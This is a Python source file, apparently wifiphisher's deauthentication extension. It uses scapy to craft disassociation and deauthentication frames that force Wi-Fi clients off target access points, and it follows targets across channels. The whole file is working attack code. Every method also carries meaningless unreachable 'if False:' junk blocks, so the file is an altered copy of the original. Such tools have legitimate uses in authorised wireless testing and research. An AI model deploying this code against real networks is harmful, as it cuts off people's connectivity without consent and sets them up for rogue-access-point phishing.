"""
Extension that sends 3 DEAUTH/DISAS Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""
import logging
from collections import defaultdict
import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants
import wifiphisher.common.globals as universal
logger = logging.getLogger(__name__)

def is_deauth_frame(packet):
    if False:
        i = 10
        return i + 15
    '\n    Determine if the sending frame is deauth frame\n    :param packet: A scapy.layers.RadioTap object\n    :type packet: scapy.layers.RadioTap\n    :return: True if the frame is belonged to deauth module\n    :rtype: bool\n    '
    if packet.subtype == 10 or packet.subtype == 12:
        return True
    return False

class Deauth(object):
    """
    Handles all the deauthentication process.
    """

    def __init__(self, data):
        if False:
            i = 10
            return i + 15
        '\n        Setup the class with all the given arguments.\n\n        :param self: A Deauth object\n        :param data: Shared data from main engine\n        :type self: Deauth\n        :type data: tuple\n        :return: None\n        :rtype: None\n        '
        self._observed_clients = set()
        self._should_continue = True
        self._data = data
        self._deauth_bssids = dict()
        self._packets_to_send = defaultdict(list)

    @staticmethod
    def _craft_packet(sender, receiver, bssid):
        if False:
            print('Hello World!')
        '\n        Return a list with disassociation packet followed by a\n        deauthentication packet\n\n        :param sender: The MAC address of the sender\n        :param receiver: The MAC address of the receiver\n        :param bssid: The MAC address of the AccessPoint\n        :type sender: str\n        :type receiver: str\n        :type bssid: str\n        :return: list\n        :rtype: A list with disassociation followed by deauthentication packet\n        '
        disassoc_part = dot11.Dot11(type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid)
        disassoc_packet = dot11.RadioTap() / disassoc_part / dot11.Dot11Disas()
        deauth_part = dot11.Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
        deauth_packet = dot11.RadioTap() / deauth_part / dot11.Dot11Deauth()
        return [disassoc_packet, deauth_packet]

    @staticmethod
    def _extract_bssid(packet):
        if False:
            i = 10
            return i + 15
        '\n        Return the bssid of access point based on the packet type\n\n        :param packet: A scapy.layers.RadioTap object\n        :type packet: scapy.layers.RadioTap\n        :return: bssid or None if it is WDS\n        :rtype: str or None\n        .. note: 0 0 -> IBBS\n                 0 1 -> from AP\n                 1 0 -> to AP\n        '
        ds_value = packet.FCfield & 3
        to_ds = ds_value & 1 != 0
        from_ds = ds_value & 2 != 0
        return not to_ds and (not from_ds) and packet.addr3 or (not to_ds and from_ds and packet.addr2) or (to_ds and (not from_ds) and packet.addr1) or None

    def _is_target(self, packet):
        if False:
            for i in range(10):
                print('nop')
        '\n        Check if this is the target attacking bssid\n        :param self: A Deauth object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Deauth\n        :type packet: scapy.layers.RadioTap\n        :return: True if this is the target attacking bssid else False\n        :rtype: bool\n        '
        if packet.addr3 != self._data.rogue_ap_mac and packet.addr3 not in self._deauth_bssids:
            try:
                essid = packet[dot11.Dot11Elt].info.decode('utf8')
            except UnicodeDecodeError:
                logger.warning('Unable to decode the essid with with bssid %s', packet.addr3)
                return False
            return self._data.args.deauth_essid and essid == self._data.args.deauth_essid or (not self._data.args.deauth_essid and (not self._data.target_ap_bssid)) or (not self._data.args.deauth_essid and self._data.target_ap_bssid == packet.addr3) or False

    def get_packet(self, packet):
        if False:
            for i in range(10):
                print('nop')
        '\n        Process the Dot11 packets and add any desired clients to\n        observed_clients.\n\n        :param self: A Deauth object\n        :param packet: A scapy.layers.RadioTap object\n        :type self: Deauth\n        :type packet: scapy.layers.RadioTap\n        :return: A tuple with channel list followed by packets list\n        :rtype: tuple\n        '
        packets_to_send = list()
        try:
            ds_value = packet.FCfield & 3
            if ds_value == 3:
                return self._packets_to_send
            receiver = packet.addr1
            sender = packet.addr2
        except AttributeError:
            logger.debug("Malformed frame doesn't contain address fields")
            return self._packets_to_send
        try:
            channel = ord(packet[dot11.Dot11Elt][2].info)
            if channel not in universal.ALL_2G_CHANNELS:
                return self._packets_to_send
        except (TypeError, IndexError):
            logger.debug("Malformed frame doesn't contain channel field")
            return self._packets_to_send
        bssid = self._extract_bssid(packet)
        if packet.haslayer(dot11.Dot11Beacon) and bssid not in self._deauth_bssids and self._is_target(packet):
            packets_to_send += self._craft_packet(bssid, constants.WIFI_BROADCAST, bssid)
            logger.info('Target deauth BSSID found: %s', bssid)
            self._deauth_bssids[bssid] = str(channel)
        elif bssid in self._deauth_bssids:
            if str(channel) != self._deauth_bssids[bssid]:
                logger.info('BSSID: %s changes channel to %d', bssid, channel)
                self._update_target_ap_frames(str(channel), str(self._deauth_bssids[bssid]), bssid)
        if bssid not in self._deauth_bssids:
            return self._packets_to_send
        clients = self._add_clients(sender, receiver, bssid)
        if clients:
            self._observed_clients.add(clients[0])
            packets_to_send += clients[1]
            logger.info('Client with BSSID %s is now getting deauthenticated', clients[0])
        self._packets_to_send[str(channel)] += packets_to_send
        return self._packets_to_send

    def _update_target_ap_frames(self, new_channel, old_channel, bssid):
        if False:
            for i in range(10):
                print('nop')
        '\n        :param self: A Deauth object\n        :param new_channel: New channel for the target AP\n        :param old_channel: Old channel for the target AP\n        :type self: Deauth\n        :param bssid: Address of the bssid\n        :type new_channel: str\n        :type old_channel: str\n        :type bssid: str\n        :return: None\n        :rtype: None\n        '
        old_channel_list = []
        new_channel_list = []
        for pkt in self._packets_to_send[old_channel]:
            if pkt.addr3 != bssid:
                old_channel_list.append(pkt)
            else:
                new_channel_list.append(pkt)
        self._packets_to_send[old_channel] = old_channel_list
        self._packets_to_send[new_channel].extend(new_channel_list)
        self._deauth_bssids[bssid] = new_channel

    def _add_clients(self, sender, receiver, bssid):
        if False:
            i = 10
            return i + 15
        '\n        Return a tuple containing client followed by packets if the given\n        packet is valid and return None otherwise\n\n        :param self: A Deauth object\n        :param sender: Address of the sender\n        :param receiver: Address of the receiver\n        :param bssid: Address of the bssid\n        :type self: Deauth\n        :type sender: str\n        :type receiver: str\n        :type bssid: str\n        :return: (client: str, packets: list) or None\n        :rtype: tuple or None\n        '
        non_valid_addresses = constants.NON_CLIENT_ADDRESSES.union(self._observed_clients)
        packets = lambda : self._craft_packet(receiver, sender, bssid) + self._craft_packet(sender, receiver, bssid)
        return sender not in non_valid_addresses and receiver not in non_valid_addresses and (sender == bssid and (receiver, packets()) or (receiver == bssid and (sender, packets()))) or None

    def send_output(self):
        if False:
            while True:
                i = 10
        '\n        Get any relevant output message\n\n        :param self: A Deauth object\n        :type self: Deauth\n        :return: A list with all the message entries\n        :rtype: list\n        '
        return list(map('DEAUTH/DISAS - {}'.format, self._observed_clients))

    def send_channels(self):
        if False:
            return 10
        '\n        Send channes to subscribe\n\n        :param self: A Deauth object\n        :type self: Deauth\n        :return: A list with all interested channels\n        :rtype: list\n        '
        if not self._data.is_freq_hop_allowed:
            return [self._data.target_ap_channel]
        if self._data.target_ap_bssid and (not self._data.args.deauth_essid) and (not self._data.args.channel_monitor):
            return [self._data.target_ap_channel]
        if self._data.args.deauth_channels and len(self._data.args.deauth_channels) > 0:
            return list(map(str, self._data.args.deauth_channels))
        return list(map(str, universal.ALL_2G_CHANNELS))

    def on_exit(self):
        if False:
            i = 10
            return i + 15
        '\n        Free all the resources regarding to this module\n        :param self: A Deauth object\n        :type self: Deauth\n        :return: None\n        :rtype: None\n        '
        pass